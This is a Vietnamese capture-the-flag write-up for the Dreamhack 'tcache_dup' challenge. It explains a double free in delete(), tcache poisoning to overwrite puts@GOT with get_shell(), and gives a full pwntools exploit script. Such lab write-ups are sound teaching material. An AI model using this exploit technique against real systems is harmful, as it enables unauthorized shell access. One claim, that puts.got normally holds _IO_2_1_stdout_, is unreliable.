# Challenge: Tcache Duplicate

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/tcache_dup_chall/tcache_dup)
- Khi thực thi chương trình như sau:
```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+0h] [rbp-10h] BYREF
  int index; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  index = 0;
  initialize(argc, argv, envp);
  while ( 1 )
  {
    puts("1. Create");
    puts("2. Delete");
    printf("> ");
    __isoc99_scanf("%d", &v3);
    if ( v3 == 1 )
    {
      create(index++);
    }
    else if ( v3 == 2 )
    {
      delete();
    }
  }
}
```
- Chương trình gồm 2 hàm, lần lượt thực thi theo thứ tự input người nhập:
```
ssize_t __fastcall create(int index)
{
  int size; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(40u);
  if ( index > 10 )
    return 0xFFFFFFFFLL;
  printf("Size: ");
  __isoc99_scanf("%d", &size);
  *(&ptr + index) = malloc(size);
  if ( !*(&ptr + index) )
    return 0xFFFFFFFFLL;
  printf("Data: ");
  return read(0, *(&ptr + index), size);
}

void delete()
{
  int v0; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  printf("idx: ");
  __isoc99_scanf("%d", &v0);
  if ( v0 <= 10 )
    free(*(&ptr + v0));
}
```
- Nhìn sơ qua chương trình khi dịch ngược, tôi thấy có hàm get_shell() nhu sau:
```
int get_shell()
{
  return system("/bin/sh");
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Partial RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        No PIE (0x400000)
+ Stripped:   No
```

## Giải pháp
- Khi chạy thử chương trình, tôi thấy rằng ở hàm delete tôi có thể khai thác Double Free do có thể free 2 lần trên cùng một địa chỉ.
```
└─$ ./tcache_dup_patched
1. Create
2. Delete
> 1
Size: 200
Data: AAAA
1. Create
2. Delete
> 2
idx: 0
1. Create
2. Delete
> 2
idx: 0
1. Create
2. Delete
>
```
- Do đó, tận dụng tcache_dup bug để thay đổi fd thành địa chỉ có thể khai thác và lấy shell.
- Khi debug, nhìn qua got tôi có được các địa chỉ sau:
```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /home/haiwh/CTF/dreamhack/tcache_dup/tcache_dup_patched:
GOT protection: Partial RELRO | Found 13 GOT entries passing the filter
[0x601018] free@GLIBC_2.2.5 -> 0x400736 (free@plt+6) ◂— push 0 /* 'h' */
[0x601020] puts@GLIBC_2.2.5 -> 0x400746 (puts@plt+6) ◂— push 1
[0x601028] __stack_chk_fail@GLIBC_2.4 -> 0x400756 (__stack_chk_fail@plt+6) ◂— push 2
[0x601030] system@GLIBC_2.2.5 -> 0x400766 (system@plt+6) ◂— push 3
[0x601038] printf@GLIBC_2.2.5 -> 0x400776 (printf@plt+6) ◂— push 4
[0x601040] alarm@GLIBC_2.2.5 -> 0x400786 (alarm@plt+6) ◂— push 5
[0x601048] read@GLIBC_2.2.5 -> 0x400796 (read@plt+6) ◂— push 6
[0x601050] __libc_start_main@GLIBC_2.2.5 -> 0x7ffff7821ab0 (__libc_start_main) ◂— push r13
[0x601058] signal@GLIBC_2.2.5 -> 0x4007b6 (signal@plt+6) ◂— push 8
[0x601060] malloc@GLIBC_2.2.5 -> 0x4007c6 (malloc@plt+6) ◂— push 9 /* 'h\t' */
[0x601068] setvbuf@GLIBC_2.2.5 -> 0x4007d6 (setvbuf@plt+6) ◂— push 0xa /* 'h\n' */
[0x601070] __isoc99_scanf@GLIBC_2.7 -> 0x4007e6 (__isoc99_scanf@plt+6) ◂— push 0xb /* 'h\x0b' */
[0x601078] exit@GLIBC_2.2.5 -> 0x4007f6 (exit@plt+6) ◂— push 0xc /* 'h\x0c' */
```
> Trong GOT, ta có được puts.got có thể dùng nó để khai thác
- Thay đổi fd của puts.got -> hàm get_shell(), tức là khi chương trình call puts.plt lúc này puts.plt sẽ nhảy vào trong puts.got để đọc giá trị được lưu trong đó và call nó. Nếu bình thường không thay đổi thì puts.got sẽ chứa _IO_2_1_stdout_, tức là khi call puts.plt lúc này sẽ đọc dữ liệu còn nếu thay đổi thành hàm get_shell().
> call puts.plt lúc này sẽ call chính hàm get_shell() và ta sẽ có shell.

## Quá trình
- Trước tiên, ta cần tạo một heap chunk và rồi dùng nó để khai thác double free.
```
create(200, b'A'*4)
delete(0)
delete(0)
```
- Do chương trình PIE tắt nên ta không cần phải tìm exe base, việc ta cần là khi đã double free chunk A -> chunk A rồi lúc này ta sẽ thay đổi chunk A thành puts.got -> get_shell() để thay đổi _IO_2_1_stdout_ thành get_shell(). Nhưng khi thay đổi puts.got rồi nhớ lấy chunk A còn thừa ra để trong tcache trở thành puts_got lúc này malloc() lần nữa mới có thể ghi đè dữ liệu trong puts.got. 
```
create(200, p64(exe.got['puts']))
create(200, b'A'*4)
create(200, p64(exe.sym['get_shell']))
```
> Khi chương trình chạy tới call puts.plt lần nữa, lúc này thực thi get_shell() và ta có được shell.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('tcache_dup_patched', checksec=False)
libc = ELF('libc-2.27.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+92

        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 12046)
else:
    p = process([exe.path])
GDB()

def create(size, data):
    slna(b'> ', 1)
    slna(b'Size: ', size)
    sla(b'Data: ', data)

def delete(idx):
    slna(b'> ', 2)
    slna(b'idx: ', idx)

create(200, b'A'*4)
delete(0)
delete(0)
create(200, p64(exe.got['puts']))
create(200, b'A'*4)
create(200, p64(exe.sym['get_shell']))

p.interactive()
```
